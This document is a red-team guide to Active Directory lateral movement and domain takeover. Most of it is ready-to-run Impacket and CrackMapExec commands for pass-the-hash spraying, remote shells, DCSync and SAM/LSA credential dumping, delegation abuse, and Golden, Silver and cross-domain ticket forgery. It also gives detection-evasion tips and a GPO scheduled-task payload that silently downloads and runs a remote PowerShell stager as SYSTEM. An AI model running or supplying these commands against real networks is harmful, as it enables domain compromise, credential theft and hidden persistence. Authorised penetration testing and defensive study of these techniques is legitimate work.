# AD Lateral Movement and Domain Dominance Guide

## Introduction and Objective

Lateral movement is the process of moving through an Active Directory environment after gaining initial access, progressively compromising systems until achieving domain dominance. This phase follows credential harvesting and transforms collected hashes, tickets, and passwords into actionable access across the domain. Domain dominance represents the ultimate objective: persistent, unrestricted control over the entire Active Directory forest.

This guide covers the complete lateral movement and domain dominance toolkit available on Kali Linux, including:

1. **Pass-the-Hash (PTH)** -- Authenticating with NTLM hashes across domain systems
2. **Remote Command Execution** -- PsExec, WMI, and SMB-based shell access
3. **DCSync Credential Harvesting** -- Extracting all domain hashes via replication
4. **GPO Abuse** -- Leveraging Group Policy for persistent deployment
5. **ACL and Delegation Exploitation** -- Abusing misconfigured permissions
6. **Forest and Domain Trust Attacks** -- Cross-domain and cross-forest compromise
7. **Persistence Strategies** -- Maintaining access through credential caching, ticket forgery, and GPO backdoors

Each technique includes complete commands, expected output analysis, OPSEC considerations, and detection evasion strategies appropriate for professional red team engagements.

## Pass-the-Hash Fundamentals

### Understanding NTLM Authentication

Pass-the-Hash exploits the NTLM authentication protocol, which accepts password hashes directly without requiring the plaintext password. When a user authenticates via NTLM, the protocol derives the NTLM hash from the password. However, if an attacker already possesses the hash (from credential dumping), they can present it directly to the authentication challenge, bypassing the need for the original password entirely.

This means that any NTLM hash obtained from LSASS memory dumping, SAM database extraction, or NTDS.dit harvesting can be used for lateral movement without cracking. The hash IS the credential for NTLM authentication.

### Hash Format and Identification

NTLM hashes appear in the format `LM:NT` where:

- LM hash: `aad3b435b51404eeaad3b435b51404ee` (empty/default for modern Windows)
- NT hash: The actual credential hash (32 hex characters)

```bash
# Example hash format as used by Impacket tools
aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f

# When LM hash is empty (common), use the full format anyway
00000000000000000000000000000000:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f
```

## Hands-on Practice: Pass-the-Hash

### Hash Spraying with CrackMapExec

The first step in lateral movement is identifying which systems accept the harvested credentials. CrackMapExec enables rapid credential testing across entire subnets.

```bash
# Test a single hash against a single target
crackmapexec smb 10.10.0.5 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f'

# Spray the hash across the entire subnet
crackmapexec smb 10.10.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f'

# Spray with multiple usernames against a hash
crackmapexec smb 10.10.0.5 -u admin administrator admin.local -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f'
```

CrackMapExec output indicates success with `(Pwn3d!)` next to the hostname, confirming administrative access on that system. Focus subsequent efforts on "Pwn3d!" targets.

### Remote Shell Access via Impacket

#### PsExec (impacket-psexec.py)

PsExec provides a semi-interactive command shell by deploying a service binary to the ADMIN$ share. It is the most straightforward method but creates a visible Windows service that may trigger EDR alerts.

```bash
# Get interactive shell with PTH
impacket-psexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f

# Execute a single command
impacket-psexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -c 'net group "Domain Admins" /domain'

# Use custom service name for stealth
impacket-psexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -service-name 'WindowsUpdateSvc'

# Use C$ share instead of ADMIN$ (may bypass some monitoring)
impacket-psexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -share C$
```

**OPSEC Note**: PsExec creates a service named `PSEXESVC` (or custom name) and writes a binary to the ADMIN$ or C$ share. The service appears in Event ID 7045 (service creation) and may trigger alerts in EDR solutions.

#### WMI Execution (impacket-wmiexec.py)

WMI execution is stealthier than PsExec because it does not write a service binary to disk. Instead, it executes commands via WMI and retrieves output through a temporary file on an SMB share.

```bash
# Get semi-interactive shell via WMI
impacket-wmiexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f

# Execute a single command
impacket-wmiexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -c 'whoami /all'

# Use custom share for output redirection
impacket-wmiexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -share C$

# Silent command execution (no output capture, stealthiest)
impacket-wmiexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -silentcommand -c 'powershell -enc <base64_encoded_command>'
```

**OPSEC Note**: WMI execution generates Event ID 4672 (special privileges logon) and Event ID 1 (process creation) for `cmd.exe` processes spawned by `wmiprvse.exe`. The temporary output file on the SMB share is a detectable artifact.

#### SMB Execution (impacket-smbexec.py)

SMBExec uses a similar approach to PsExec but with a different service execution mechanism. It creates a temporary service that executes commands and self-destructs.

```bash
# Get semi-interactive shell
impacket-smbexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f

# Execute single command
impacket-smbexec corp.local/administrator@10.10.0.5 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -c 'ipconfig /all'
```

### CrackMapExec Command Execution

For rapid command execution without establishing a full shell, CrackMapExec provides efficient one-liner capabilities.

```bash
# Execute command across all accessible hosts
crackmapexec smb 10.10.0.0/24 \
  -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f' \
  -x 'hostname'

# Execute PowerShell command
crackmapexec smb 10.10.0.5 \
  -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f' \
  -X 'Get-Process | Select-Object -First 10'

# Enumerate network interfaces on target
crackmapexec smb 10.10.0.5 \
  -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f' \
  --interfaces

# Enumerate logged-on users
crackmapexec smb 10.10.0.5 \
  -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f' \
  --loggedon-users

# Enumerate sessions
crackmapexec smb 10.10.0.5 \
  -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f' \
  --sessions
```

## DCSync Credential Harvesting

### Attack Overview

DCSync is the most impactful credential harvesting technique in Active Directory. It simulates the behavior of a domain controller requesting replication of password data from another domain controller via the DRSUAPI protocol. This technique extracts every password hash in the domain including the krbtgt hash (critical for Golden Tickets), Domain Admin hashes, service account hashes, and machine account passwords.

DCSync requires either Domain Admin privileges or specific ACL permissions: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All granted on the domain head object.

### Hands-on Practice

**Step 1**: Verify that the compromised account has sufficient privileges for DCSync. Domain Admins, Enterprise Admins, and any account with the Replicating Directory Changes permissions can perform this attack.

```bash
# Verify Domain Admin membership
crackmapexec smb 10.10.0.5 -u svc_compromised -p 'Password123!' -x 'net group "Domain Admins" /domain'
```

**Step 2**: Perform full domain credential dump.

```bash
# DCSync via secretsdump with hash authentication
impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f

# Save output to organized files
impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -outputfile domain_dump

# Extract only NTLM hashes (faster, focused output)
impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -just-dc-ntlm

# Target specific high-value accounts
impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -just-dc-user "krbtgt"

impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f \
  -just-dc-user "administrator"
```

**Step 3**: Parse and organize extracted credentials.

```bash
# Count extracted hashes
wc -l domain_dump.ntds

# Filter for Domain Admin accounts (typically RID < 1000)
grep ":::" domain_dump.ntds | cut -d: -f1,2,3 | sort

# Identify krbtgt hash for Golden Ticket creation
grep "krbtgt" domain_dump.ntds
```

**Step 4**: Validate harvested credentials through lateral movement.

```bash
# Test extracted hashes against other domain systems
crackmapexec smb 10.10.0.0/24 -u administrator -H 'extracted_admin_hash'

# Test service account hashes
crackmapexec smb 10.10.0.0/24 -u svc_mssql -H 'extracted_svc_hash'
```

## GPO Abuse for Persistence and Deployment

### Understanding GPO Attack Surface

Group Policy Objects control configuration across domain-joined systems. An attacker with GPO edit privileges can deploy scheduled tasks, modify registry settings, execute scripts, or change security configurations across all systems in the GPO scope. GPOs are stored in the SYSVOL share, which is accessible to all authenticated users for reading but writable only by privileged accounts.

### Hands-on Practice

**Step 1**: Enumerate existing GPOs and their scopes.

```bash
# List all GPOs via LDAP
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 gpos

# Enumerate GPO with crackmapexec
crackmapexec smb 10.10.0.1 \
  -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f' \
  --gpo

# Find GPOs that the compromised user can modify
# Use BloodHound: "Find GPOs that can be modified by user X"
```

**Step 2**: Access and modify GPO via SYSVOL share.

```bash
# Connect to SYSVOL via SMB
impacket-smbclient corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:3f5d6a7e8c9b0a1d2e3f4a5b6c7d8e9f

# Navigate to the GPO path
# \\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\

# Key files to target:
# Machine/Preferences/ScheduledTasks/ScheduledTasks.xml
# Machine/Preferences/Registry/registry.xml
# Machine/Scripts/Startup/
# User/Scripts/Logon/
```

**Step 3**: Deploy a scheduled task via GPO Preferences (conceptual walkthrough).

```xml
<!-- ScheduledTasks.xml payload -->
<ScheduledTasks clsid="{CC63F8B0-3B7A-4e99-85F9-A38BEA0E3BAA}">
  <ImmediateTaskV2 name="SystemHealthCheck" image="0" changed="2025-01-01 00:00:00" uid="{GUID}">
    <Properties action="C" name="SystemHealthCheck" runAs="NT AUTHORITY\System">
      <Task version="1.3">
        <RegistrationInfo />
        <Principals>
          <Principal id="Author">
            <LogonType>ServiceAccount</LogonType>
            <RunLevel>HighestAvailable</RunLevel>
          </Principal>
        </Principals>
        <Actions>
          <Exec>
            <Command>powershell.exe</Command>
            <Arguments>-ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.0.100/stage.ps1')"</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
```

## ACL and Delegation Exploitation

### Identifying Exploitable ACLs

Active Directory Access Control Lists define who can perform what operations on directory objects. Misconfigured ACLs are among the most common vulnerabilities found in enterprise AD environments. Key dangerous ACL rights include:

- **GenericAll**: Full control over the target object (can reset passwords, modify group membership, etc.)
- **GenericWrite**: Can modify any attribute of the target object
- **WriteDacl**: Can modify the DACL of the target object (grant self any permission)
- **WriteOwner**: Can take ownership of the target object and then modify its DACL
- **ForceChangePassword**: Can reset the target user's password
- **AllowedToAuthenticate**: Can authenticate as the target computer account

### Hands-on Practice

```bash
# Enumerate ACLs via ldeep
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 acl

# Enumerate delegation configurations
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 delegations

# Find unconstrained delegation computers (high value targets)
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  cn dnshostname

# Find constrained delegation configurations
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" \
  "(&(objectClass=user)(msds-allowedtodelegateto=*))" \
  sAMAccountName msDS-AllowedToDelegateTo
```

### Exploiting Constrained Delegation via S4U

When a service account has constrained delegation configured, compromise of that account enables impersonation of any user to the delegated services.

```bash
# Exploit S4U2Self + S4U2Proxy
impacket-getST -spn cifs/dc01.corp.local -impersonate administrator \
  corp.local/svc_deleg:'DelegPass123!'

# Use the impersonated ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass
```

## Forest and Domain Trust Exploitation

### Understanding Trust Relationships

Active Directory forests can contain multiple domains connected by trust relationships. Trusts define how authentication flows between domains. Understanding trust types and directions is critical for cross-domain compromise:

- **Parent-Child**: Automatic bidirectional trust within a forest
- **Forest Trust**: Trust between separate forests (can be one-way or two-way)
- **External Trust**: Non-transitive trust to domains outside the forest
- **Shortcut Trust**: Transitive trust between domains in the same forest for optimization

### Hands-on Practice

```bash
# Enumerate trust relationships
ldeep ldap -u svc_ldap -p 'Password123!' -d corp.local -s ldap://10.10.0.1 trusts

# Enumerate via LDAP
ldapsearch -x -H ldap://10.10.0.1 -D "CORP\\svc_ldap" -w 'Password123!' \
  -b "dc=corp,dc=local" "(objectClass=trustedDomain)" \
  cn trustDirection trustType flatName

# Forge ticket with Extra SID for cross-domain Enterprise Admin access
# Requires the child domain's krbtgt hash
impacket-ticketer \
  -nthash 'child_krbtgt_hash' \
  -domain-sid S-1-5-21-CHILD-SID \
  -domain child.corp.local \
  -extra-sid S-1-5-21-PARENT-SID-519 \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@parentdc.parent.local -k -no-pass
```

## Persistence Strategies

### Multi-Layer Persistence

Professional red teams establish multiple persistence mechanisms to survive remediation attempts. A robust persistence strategy includes:

**Layer 1 - Credential Persistence:**

```bash
# Golden Ticket (survives all password resets except krbtgt)
impacket-ticketer -nthash 'krbtgt_hash' \
  -domain-sid S-1-5-21-XXXX -domain corp.local \
  -duration 3650 administrator

# DCSync-capable account (create a backdoor user with replication rights)
# Requires domain admin to grant the DCSync ACL to a new account
```

**Layer 2 - Ticket Persistence:**

```bash
# Silver Tickets for critical services
impacket-ticketer -nthash 'svc_hash' \
  -domain-sid S-1-5-21-XXXX -domain corp.local \
  -spn cifs/fileserver.corp.local administrator

# Multiple service Silver Tickets for redundancy
impacket-ticketer -nthash 'ldap_hash' \
  -domain-sid S-1-5-21-XXXX -domain corp.local \
  -spn ldap/dc01.corp.local administrator
```

**Layer 3 - GPO Persistence:**

```bash
# Deploy scheduled task via GPO that re-establishes access
# Edit \\corp.local\SYSVOL\corp.local\Policies\{GUID}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
```

### Credential Caching Strategy

Harvest and cache credentials at every opportunity during the engagement:

```bash
# Dump SAM from every accessible system
crackmapexec smb 10.10.0.0/24 \
  -u administrator -H 'admin_hash' --sam

# Dump LSA secrets from accessible systems
crackmapexec smb 10.10.0.0/24 \
  -u administrator -H 'admin_hash' --lsa

# Full NTDS dump from domain controller
impacket-secretsdump corp.local/administrator@10.10.0.1 \
  -hashes aad3b435b51404eeaad3b435b51404ee:admin_hash \
  -outputfile full_domain_dump
```

## References and Resources

- [Impacket Secretsdump Documentation](https://www.secureauth.com/labs/open-source-tools/impacket) -- Reference for DCSync and credential dumping techniques
- [CrackMapExec Wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki) -- Complete CrackMapExec usage guide for lateral movement
- [ADSecurity.org - Domain Persistence](https://adsecurity.org/?p=2362) -- Sean Metcalf's research on AD persistence techniques
- [MITRE ATT&CK - Lateral Movement (TA0008)](https://attack.mitre.org/tactics/TA0008/) -- MITRE framework mapping of lateral movement techniques
- [SpecterOps - Certified Pre-Owned](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) -- Comprehensive research on AD certificate services attacks and lateral movement
- [BloodHound Documentation](https://bloodhound.readthedocs.io/) -- Attack path analysis for identifying lateral movement opportunities
- [Microsoft - Securing Privileged Access](https://learn.microsoft.com/en-us/security/compass/overview) -- Microsoft's official guidance on securing privileged access and preventing lateral movement
- [Rasta Mouse - Lateral Movement with Impacket](https://rastamouse.me/) -- Practical lateral movement techniques using Impacket on Linux
- [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/) -- Community-maintained AD attack methodology reference
